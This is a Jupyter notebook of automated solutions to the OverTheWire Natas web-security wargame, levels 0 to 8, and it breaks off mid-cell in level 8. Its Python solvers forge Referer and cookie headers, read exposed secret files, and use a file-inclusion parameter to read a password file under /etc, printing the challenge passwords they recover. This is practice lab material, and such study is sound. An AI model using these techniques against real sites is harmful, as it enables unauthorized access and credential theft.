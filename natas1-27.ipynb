{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas.labs.overthewire.org"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## utils"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Help on class Natas in module __main__:\n",
      "\n",
      "class Natas(builtins.object)\n",
      " |  class for managing natas flags and providing url access methods\n",
      " |  hiding the basic auth for the current natas challenge\n",
      " |  \n",
      " |  Methods defined here:\n",
      " |  \n",
      " |  __init__(self)\n",
      " |      Initialize self.  See help(type(self)) for accurate signature.\n",
      " |  \n",
      " |  get_request(self, url='', method=None, level=None, flag=None)\n",
      " |      Creates a url request object which handles basic authentication for the current natas challenge. Url may be relative to the current natas challenge.\n",
      " |  \n",
      " |  grep_flag(string)\n",
      " |      finds and returns a list of potential natas flags in the given string\n",
      " |  \n",
      " |  next_level(self, flag)\n",
      " |      uses the flag to proceed to the next level\n",
      " |      validates and stores the flag\n",
      " |  \n",
      " |  readall(self, url='', level=None, flag=None)\n",
      " |      read and return the string response of the given url / request object\n",
      " |  \n",
      " |  set_level(self, level, flag=None)\n",
      " |      use authentication of the given level\n",
      " |  \n",
      " |  urlopen(self, url='', level=None, flag=None)\n",
      " |      Natas urlopen wrapper which handles basic authentication for the current natas challenge. Url may be relative to the current natas challenge.\n",
      " |  \n",
      " |  ----------------------------------------------------------------------\n",
      " |  Data descriptors defined here:\n",
      " |  \n",
      " |  __dict__\n",
      " |      dictionary for instance variables (if defined)\n",
      " |  \n",
      " |  __weakref__\n",
      " |      list of weak references to the object (if defined)\n",
      "\n",
      "Help on class NatasLevel in module __main__:\n",
      "\n",
      "class NatasLevel(builtins.object)\n",
      " |  NatasLevel(level, flag=None, natas=<__main__.Natas object at 0x7f4fac37ec10>)\n",
      " |  \n",
      " |  Function decorator which automatically does \n",
      " |  \n",
      " |  natas.set_level(level)\n",
      " |  flag = f()\n",
      " |  natas.next_level(flag)\n",
      " |  \n",
      " |  for the given level on a function f\n",
      " |  \n",
      " |  example usage:\n",
      " |  \n",
      " |  @NatasLevel('natas42')\n",
      " |  def f():\n",
      " |      return 'next_flag'\n",
      " |  \n",
      " |  Methods defined here:\n",
      " |  \n",
      " |  __call__(self, func)\n",
      " |      Call self as a function.\n",
      " |  \n",
      " |  __init__(self, level, flag=None, natas=<__main__.Natas object at 0x7f4fac37ec10>)\n",
      " |      Initialize self.  See help(type(self)) for accurate signature.\n",
      " |  \n",
      " |  decoratedFunc(self, *positional_args, **dict_args)\n",
      " |  \n",
      " |  ----------------------------------------------------------------------\n",
      " |  Data descriptors defined here:\n",
      " |  \n",
      " |  __dict__\n",
      " |      dictionary for instance variables (if defined)\n",
      " |  \n",
      " |  __weakref__\n",
      " |      list of weak references to the object (if defined)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from IPython.display import HTML \n",
    "\n",
    "import binascii\n",
    "import re\n",
    "import time\n",
    "from urllib.request import urlopen, Request\n",
    "from urllib.request import HTTPHandler\n",
    "from urllib.parse import quote, urlencode, quote, unquote\n",
    "\n",
    "class Natas:\n",
    "    \"\"\"\n",
    "    class for managing natas flags and providing url access methods\n",
    "    hiding the basic auth for the current natas challenge\n",
    "    \"\"\"\n",
    "    def __init__(self):\n",
    "        self.natas_flags = {}\n",
    "        \n",
    "        self.level = -1\n",
    "        self.currentFlag = ''            \n",
    "    \n",
    "    # set current level (and flag)\n",
    "    def set_level(self, level, flag = None):\n",
    "        \"\"\"\n",
    "        use authentication of the given level\n",
    "        \"\"\"\n",
    "        if isinstance(level, str):\n",
    "            level = int(level.replace('natas', ''))\n",
    "        \n",
    "        if not flag is None:\n",
    "            # if flag is given check flag validity and store flag          \n",
    "            try:\n",
    "                self.readall(level = level, flag = flag)\n",
    "                self.natas_flags[level] = flag\n",
    "            except Exception as e:\n",
    "                raise Exception('flag is invalid for level ' + str(level) + ': ' + flag)\n",
    "\n",
    "                \n",
    "        if not level in self.natas_flags:\n",
    "            raise Exception('no flag stored for level ' + str(level))\n",
    "        \n",
    "        self.level = level\n",
    "        self.currentFlag = self.natas_flags[self.level]\n",
    "    \n",
    "    def next_level(self, flag):\n",
    "        \"\"\"\n",
    "        uses the flag to proceed to the next level\n",
    "        validates and stores the flag\n",
    "        \"\"\"\n",
    "        self.set_level(self.level+1, flag)\n",
    "\n",
    "    def get_request(self, url = '', method = None, level = None, flag = None):\n",
    "        \"\"\"\n",
    "        Creates a url request object which handles basic authentication for the current natas challenge. Url may be relative to the current natas challenge.\n",
    "        \"\"\"\n",
    "        if level is None:\n",
    "            level = self.level\n",
    "        if flag is None:\n",
    "            flag = self.currentFlag\n",
    "        \n",
    "        if not url.startswith('http'):\n",
    "            url = 'http://natas' + str(level) + '.natas.labs.overthewire.org/' + url\n",
    "        \n",
    "        username = 'natas' + str(level)\n",
    "        password = flag\n",
    "        credentials = username + ':' + password\n",
    "        auth_header = 'Basic ' + binascii.b2a_base64( credentials.encode() ).strip().decode()\n",
    "        \n",
    "        request = Request(url, method = method)\n",
    "        request.add_header('Authorization', auth_header)\n",
    "        \n",
    "        return request\n",
    "\n",
    "    def urlopen(self, url = '', level = None, flag = None):\n",
    "        \"\"\"\n",
    "        Natas urlopen wrapper which handles basic authentication for the current natas challenge. Url may be relative to the current natas challenge.\n",
    "        \"\"\"\n",
    "        if not isinstance(url, Request):\n",
    "            url = self.get_request(url, level = level, flag = flag)\n",
    "        \n",
    "        return urlopen(url)\n",
    "    \n",
    "    def readall(self, url = '', level = None, flag = None):\n",
    "        \"\"\"\n",
    "        read and return the string response of the given url / request object\n",
    "        \"\"\"\n",
    "        return self.urlopen(url, level, flag).read().decode()\n",
    "    \n",
    "    def grep_flag(string):\n",
    "        \"\"\"\n",
    "        finds and returns a list of potential natas flags in the given string\n",
    "        \"\"\"\n",
    "        return re.findall('\\w{32}', string)\n",
    "\n",
    "natas = Natas()\n",
    "    \n",
    "class NatasLevel:\n",
    "    \"\"\"\n",
    "    Function decorator which automatically does \n",
    "    \n",
    "    natas.set_level(level)\n",
    "    flag = f()\n",
    "    natas.next_level(flag)\n",
    "    \n",
    "    for the given level on a function f\n",
    "    \n",
    "    example usage:\n",
    "    \n",
    "    @NatasLevel('natas42')\n",
    "    def f():\n",
    "        return 'next_flag'\n",
    "    \"\"\"\n",
    "    def __init__(self, level, flag = None, natas = natas):\n",
    "        self.natas = natas\n",
    "        \n",
    "        self.natas.set_level(level, flag)\n",
    "    \n",
    "    def decoratedFunc(self, *positional_args, **dict_args):\n",
    "        if natas.level+1 in natas.natas_flags:\n",
    "            # do not execute a challenge if the flag of the next level is known\n",
    "            flag = natas.natas_flags[natas.level+1]\n",
    "        else:\n",
    "            flag = self.func(*positional_args, **dict_args)\n",
    "        \n",
    "        self.natas.next_level(flag)\n",
    "        return flag\n",
    "        \n",
    "    def __call__(self, func):\n",
    "        self.func = func\n",
    "        return self.decoratedFunc\n",
    "\n",
    "help(Natas)\n",
    "help(NatasLevel)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# speedup jupyter notebook by not executing bruteforce based challenges again :)\n",
    "natas.set_level('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')\n",
    "natas.set_level('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')\n",
    "natas.set_level('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')\n",
    "natas.set_level('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')\n",
    "natas.set_level('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas0\n",
    "http://natas0.natas.labs.overthewire.org/\n",
    "\n",
    "the flag is hidden in a omment in the html source "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'gtVrDuiDfck831PqWsLEZy5gyDz1clto'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas0', 'natas0')\n",
    "def natas0():\n",
    "    reply = natas.readall()\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "    \n",
    "natas0()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas1\n",
    "http://natas1.natas.labs.overthewire.org/\n",
    "\n",
    "again ... but right clicking has been disabled per javascript"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas1')\n",
    "def natas1():\n",
    "    reply = natas.readall()\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "    \n",
    "natas1()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas2\n",
    "http://natas2.natas.labs.overthewire.org/\n",
    "\n",
    "- site has a *files/pixel.png* image on it\n",
    "- directory *files/* is browsable\n",
    "- there is a *files/users.txt*"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
       "<html>\n",
       " <head>\n",
       "  <title>Index of /files</title>\n",
       " </head>\n",
       " <body>\n",
       "<h1>Index of /files</h1>\n",
       "  <table>\n",
       "   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>\n",
       "   <tr><th colspan=\"5\"><hr></th></tr>\n",
       "<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"></td><td><a href=\"/\">Parent Directory</a></td><td>&nbsp;</td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\n",
       "<tr><td valign=\"top\"><img src=\"/icons/image2.gif\" alt=\"[IMG]\"></td><td><a href=\"pixel.png\">pixel.png</a></td><td align=\"right\">2016-12-15 16:07  </td><td align=\"right\">303 </td><td>&nbsp;</td></tr>\n",
       "<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"users.txt\">users.txt</a></td><td align=\"right\">2016-12-20 05:15  </td><td align=\"right\">145 </td><td>&nbsp;</td></tr>\n",
       "   <tr><th colspan=\"5\"><hr></th></tr>\n",
       "</table>\n",
       "<address>Apache/2.4.10 (Debian) Server at natas2.natas.labs.overthewire.org Port 80</address>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "users.txt:\n",
      "# username:password\n",
      "alice:BYNdCesZqW\n",
      "bob:jw2ueICLvT\n",
      "charlie:G5vCxkVV3m\n",
      "natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14\n",
      "eve:zo4mJWyNj2\n",
      "mallory:9urtcpzBmH\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas2')\n",
    "def natas2():\n",
    "    file_dir = natas.urlopen('files/').read().decode()\n",
    "    display(HTML(file_dir))\n",
    "    \n",
    "    reply = natas.urlopen('files/users.txt').read().decode()\n",
    "    print('users.txt:\\n' + reply)\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas2()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas3\n",
    "http://natas3.natas.labs.overthewire.org/\n",
    "\n",
    "- text in source code hints at there must be a robots.txt file\n",
    "- robots.txt hints to */s3cr3t/* dir which is browsable\n",
    "- reveals the existence of a *users.txt* file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "robots.txt:\n",
      "User-agent: *\n",
      "Disallow: /s3cr3t/\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
       "<html>\n",
       " <head>\n",
       "  <title>Index of /s3cr3t</title>\n",
       " </head>\n",
       " <body>\n",
       "<h1>Index of /s3cr3t</h1>\n",
       "  <table>\n",
       "   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>\n",
       "   <tr><th colspan=\"5\"><hr></th></tr>\n",
       "<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"></td><td><a href=\"/\">Parent Directory</a></td><td>&nbsp;</td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\n",
       "<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"users.txt\">users.txt</a></td><td align=\"right\">2016-12-20 05:15  </td><td align=\"right\"> 40 </td><td>&nbsp;</td></tr>\n",
       "   <tr><th colspan=\"5\"><hr></th></tr>\n",
       "</table>\n",
       "<address>Apache/2.4.10 (Debian) Server at natas3.natas.labs.overthewire.org Port 80</address>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "users.txt:\n",
      "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas3')\n",
    "def natas3():\n",
    "    robots_txt = natas.urlopen('robots.txt').read().decode()\n",
    "    print('robots.txt:\\n' + robots_txt)\n",
    "    \n",
    "    secret_dir = natas.urlopen('s3cr3t/').read().decode()\n",
    "    display(HTML(secret_dir))\n",
    "    \n",
    "    reply = natas.urlopen('s3cr3t/users.txt').read().decode()\n",
    "    print('users.txt:\\n' + reply)\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas3()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### natas4\n",
    "http://natas4.natas.labs.overthewire.org/\n",
    "\n",
    "allows access only from referrer *http://natas5.natas.labs.overthewire.org*"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\" };</script></head>\n",
       "<body>\n",
       "<h1>natas4</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\n",
       "<br/>\n",
       "<div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas4')\n",
    "def natas4():\n",
    "    request = natas.get_request()\n",
    "    request.add_header('Referer', 'http://natas5.natas.labs.overthewire.org/')\n",
    "    reply = natas.readall(request)\n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "    \n",
    "natas4()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 5\n",
    "http://natas5.natas.labs.overthewire.org/\n",
    "\n",
    "- site claims to be not logged\n",
    "- sets a cookie *loggedin=0*"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas5\", \"pass\": \"iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\" };</script></head>\n",
       "<body>\n",
       "<h1>natas5</h1>\n",
       "<div id=\"content\">\n",
       "Access disallowed. You are not logged in</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('Date', 'Mon, 23 Sep 2019 18:16:06 GMT'), ('Server', 'Apache/2.4.10 (Debian)'), ('Set-Cookie', 'loggedin=0'), ('Vary', 'Accept-Encoding'), ('Content-Length', '855'), ('Connection', 'close'), ('Content-Type', 'text/html; charset=UTF-8')]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas5\", \"pass\": \"iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\" };</script></head>\n",
       "<body>\n",
       "<h1>natas5</h1>\n",
       "<div id=\"content\">\n",
       "Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas5')\n",
    "def natas5():\n",
    "    response = natas.urlopen()\n",
    "\n",
    "    page = response.read().decode()\n",
    "    display(HTML(page))\n",
    "    print(response.getheaders())\n",
    "    \n",
    "    request = natas.get_request()\n",
    "    request.add_header('Cookie', 'loggedin=1')\n",
    "    reply = natas.readall(request)\n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas5()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 6\n",
    "http://natas6.natas.labs.overthewire.org/\n",
    "\n",
    "- site has a link to */index-source.html*\n",
    "- */index-source.html* reveals that the index.php is doing\n",
    "  ```php\n",
    "  include \"includes/secret.inc\";\n",
    "  ```\n",
    "- the secret from the include file send to the form is revealing the flag\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas6\", \"pass\": \"aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1\" };</script></head>\n",
       "<body>\n",
       "<h1>natas6</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9\n",
       "<form method=post>\n",
       "Input secret: <input name=secret><br>\n",
       "<input type=submit name=submit>\n",
       "</form>\n",
       "\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas6')\n",
    "def natas6():\n",
    "    page = natas.readall('includes/secret.inc')\n",
    "    print(page)\n",
    "    \n",
    "    secret = re.findall('\\$secret = \"(\\w*)\";', page)[0]\n",
    "    \n",
    "    request = natas.get_request(method = 'POST')\n",
    "    request.data = urlencode({'secret': secret, 'submit': 'send'}).encode()\n",
    "    \n",
    "    reply = natas.readall(request)\n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "    \n",
    "natas6()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas7\n",
    "http://natas7.natas.labs.overthewire.org/\n",
    "\n",
    "- has links pointing to index.php?page=...\n",
    "- has a hint in the source that the flag is located at /etc/natas_webpass/natas8\n",
    "- index.php accepts any file path in the page parameter\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9\" };</script></head>\n",
       "<body>\n",
       "<h1>natas7</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "<a href=\"index.php?page=home\">Home</a>\n",
       "<a href=\"index.php?page=about\">About</a>\n",
       "<br>\n",
       "<br>\n",
       "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe\n",
       "\n",
       "<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas7')\n",
    "def natas7():    \n",
    "    reply = natas.readall('index.php?page=/etc/natas_webpass/natas8')\n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "    \n",
    "natas7()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas8\n",
    "http://natas8.natas.labs.overthewire.org/\n",
    "\n",
    "- index-source.html shows how the secret is encoded\n",
    "  ```php\n",
    "    function encodeSecret($secret) {\n",
    "        return bin2hex(strrev(base64_encode($secret)));\n",
    "    }\n",
    "  ```\n",
    "- filling in the decoded secret and submitting the form gives us the flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "decoded secret: oubWYf2kBq\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas8\", \"pass\": \"DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe\" };</script></head>\n",
       "<body>\n",
       "<h1>natas8</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl\n",
       "<form method=post>\n",
       "Input secret: <input name=secret><br>\n",
       "<input type=submit name=submit>\n",
       "</form>\n",
       "\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas8')\n",
    "def natas8():\n",
    "    index_source = natas.readall('index-source.html')\n",
    "    \n",
    "    encoded_secret = re.findall('\\$encodedSecret&nbsp;=&nbsp;\"(\\w*)\";', index_source)[0]\n",
    "    encoded_secret = binascii.unhexlify(encoded_secret)\n",
    "    encoded_secret = encoded_secret[::-1]\n",
    "    encoded_secret = binascii.a2b_base64(encoded_secret).decode()\n",
    "   \n",
    "    print('decoded secret: ' + encoded_secret)\n",
    "\n",
    "    request = natas.get_request(method='POST')\n",
    "    request.data = urlencode({'secret': encoded_secret, 'submit': 'send'}).encode()\n",
    "    reply = natas.readall(request)\n",
    "    \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
